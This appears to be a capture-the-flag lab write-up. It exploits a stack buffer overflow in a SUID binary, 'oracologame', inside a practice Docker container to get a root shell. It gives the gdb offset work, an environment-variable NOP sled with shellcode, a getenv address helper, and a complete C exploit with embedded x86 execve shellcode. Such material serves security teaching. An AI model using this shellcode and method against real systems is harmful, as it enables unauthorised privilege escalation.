goal:
Get root access to machine, connect as hackme user with the following command: 

docker exec -it -u hackme hackme1_hackme_1 bash

 

When you're on terminal of container go in the hackme dir:

cd /home/hackme. Here there is oracologame binary...
solution:
if you try to do 

 

hackme@32a9ae8e17e3:~$ ls -l

total 12

 

-rwsr-xr-x 1 root root 8644 Nov 20  2016 oracologame

It's a suid program, and we have the execution permission... so if you exploit it you'll have root access! So let's look at the oracolo game: 

hackme@32a9ae8e17e3:~$ ./oracologame 

Uso : ./oracologame <nome> 

hackme@32a9ae8e17e3:~$ ./oracologame jack

Ciao jack!

Tornerai a casa con pippozzo

hackme@32a9ae8e17e3:~$ ./oracologame peppe

Ciao peppe!

Incontrerai una persona speciale

hackme@32a9ae8e17e3:~$ ./oracologame $(perl -e 'print "A"x90')

Ciao AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!

Oggi va male...

hackme@32a9ae8e17e3:~$ ./oracologame $(perl -e 'print "A"x150')

Ciao AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!

Oggi va male...

Segmentation fault

 

hackme@32a9ae8e17e3:~$

The buffer starts at d6a8, while 080484c4 is the address of strcpy inside oracolo function. We've to search inside the buffer some return address for this function. It could be 0804854b located at ffffd71a in the stack. This value is overwritten by multiple "A" input. We can calculate the difference between ret address and start with gdb:

 

(gdb) p 0xffffd71a - 0xffffd6a8

 

$3 = 114

Let's do some try with input to confirm this: 

(gdb) run $(perl -e 'print "A"x114')

The program being debugged has been started already.

If we run with 114 'A' the program goes in segmentation fault, while if we try with 110 the program exit with wrong value but it doesn't go in segmentation fault. The address is 4 byte long and each A is one byte so we confirm that the difference between return address and buffer input is 114 bytes size. Now you can try to exploit this buffer overflow

Exploit Method 1

 In the user directory you've already shellcode.bin that is a shellcode used to obtain a shell: 

hackme@abe9b81a1dda:~$ cat shellcode.bin 

1?1?1ə??̀j

 

         XQh//shh/bin??Q??S??̀hackme@abe9b81a1dda:~$ 

Let's save this in an environment variable:

hackme@abe9b81a1dda:~$ export SHELLCODE=$(perl -e 'print \x90x200')$(cat shellcode.bin)

hackme@abe9b81a1dda:~$ echo $SHELLCODE 

SCALAR(0x81c78ec)1?1?1ə??̀j

 

                          XQh//shh/bin??Q??S??̀

We've added 120 bytes of NOP sled.

The environment address  in the stack depends on the program name in execution (the cause is that Linux must also save the program name in the stack). How we find this address? With the getenv C (https://www.tutorialspoint.com/c_standard_library/c_function_getenv.htm) function.

We can write a program with a little hack in order to manage the different addresses with different name. 

The script is the following (read Jon Erickson book for more informations about this): 

#include <stdio.h>

#include <stdlib.h>

#include <string.h>

 

int main(int argc, char *argv[]) {

        char *ptr;

 

        if(argc < 3) {

                printf("Usage: %s <environment variable> <target program name>\n", argv[0]);

                exit(0);

        }   

        ptr = getenv(argv[1]); /* get env var location */

        ptr += (strlen(argv[0]) - strlen(argv[2]))*2; /* adjust for program name */

        printf("%s will be at %p\n", argv[1], ptr);

 

}

Let's save this in getenvaddr.c file and compile with gcc -o getenvaddr getenvaddr.c. 

Now we use with SHELLCODE environment: 

hackme@abe9b81a1dda:~$ ./getenvaddr SHELLCODE ./oracologame

SHELLCODE will be at 0xffffd8dd

 

hackme@abe9b81a1dda:~$ 

 

If we try directly: 

 

hackme@abe9b81a1dda:~$ ./oracologame $(perl -e 'print "\xdd\xd8\xff\xff"'x100)

Ciao ????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????!

UWVS?"?

# whoami

root

# 

We get the root shell. 

If it doesn't work you can try to add an offset to environment address (in order to get the address in the middle of the NOP sled)... this is because sometimes the OS could change the environment address:

Exploit method 2 

We can also use  the "system" function that call a process in order to exploit this... this is a classic method used when you'll download an exploit from internet, because it doesn't depends by environment variables... (when you download an exploit you should check if it does what expected, because could potentially destroy your pc or open backdoors on your pc!!!) So be carefoul ;) ! 

The script is the following: 

 #include <stdio.h>

#include <stdlib.h>

#include <string.h>

char shellcode[]=

"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"

"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"

"\xe1\xcd\x80";

 

int main(int argc, char *argv[]) {

   unsigned int i, *ptr, ret, offset=270;

   char *command, *buffer;

 

   command = (char *) malloc(200);

   bzero(command, 200); // zero out the new memory

 

   strcpy(command, "./oracologame \'"); // start command buffer

   buffer = command + strlen(command); // set buffer at the end

 

   if(argc > 1) // set offset

      offset = atoi(argv[1]);

 

   ret = (unsigned int) &i - offset; // set return address

 

   for(i=0; i < 160; i+=4) // fill buffer with return address

      *((unsigned int *)(buffer+i)) = ret;

   memset(buffer, 0x90, 60); // build NOP sled

   memcpy(buffer+60, shellcode, sizeof(shellcode)-1);

 

   strcat(command, "\'");

 

   system(command); // run exploit

   free(command);

}

 

 

 

 Use with different offset value and you can have root access: 

root@abe9b81a1dda:/home/hackme# gcc -o exploit_oracologame exploit_oracologame.c 

root@abe9b81a1dda:/home/hackme# ./exploit_oracologame
